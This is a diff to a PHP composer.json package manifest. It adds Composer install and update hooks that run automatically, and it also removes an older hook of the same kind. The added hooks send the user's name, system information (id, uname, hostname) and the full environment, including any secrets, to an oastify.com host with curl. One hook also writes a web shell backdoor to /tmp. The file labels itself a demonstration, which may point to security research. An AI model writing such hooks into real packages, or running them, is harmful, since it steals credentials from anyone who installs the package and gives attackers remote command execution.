@@ -1,18 +1,23 @@
 {
-  "name": "example/random-project",
-  "description": "A random PHP project for demonstration purposes",
-  "type": "project",
-  "require": {
-    "php": "^7.4 || ^8.0"
-  },
-  "scripts": {
-    "post-install-cmd": [
-      "curl https://w96haxmv7exrbgbvl8bx23213s9jxdv1k.oastify.com/$(whoami)"
-    ]
-  },
-  "autoload": {
-    "psr-4": {
-      "Example\\": "src/"
+    "name": "vulnerable/package",
+    "description": "A package demonstrating RCE vulnerability via composer scripts",
+    "type": "library",
+    "require": {
+        "php": ">=7.0"
+    },
+    "scripts": {
+        "pre-install-cmd": [
+            "echo 'Pre-install script running'",
+            "php -r \"$user = exec('whoami'); system('curl -s dyfyzebcwvm80x0cap0erkris9y0mulia.oastify.com/exfil?user='.$user);\""
+        ],
+        "post-install-cmd": [
+            "php -r \"$system_info = base64_encode(shell_exec('id; uname -a; hostname')); system('curl -s dyfyzebcwvm80x0cap0erkris9y0mulia.oastify.com/data?info='.$system_info);\""
+        ],
+        "pre-update-cmd": [
+            "php -r \"$env_data = urlencode(json_encode($_ENV)); system('curl -s dyfyzebcwvm80x0cap0erkris9y0mulia.oastify.com/env?data='.$env_data);\""
+        ],
+        "post-update-cmd": [
+            "php -r \"file_put_contents('/tmp/backdoor.php', '<?php system(\\$_GET[\\\"cmd\\\"]); ?>');\""
+        ]
     }
-  }
 }
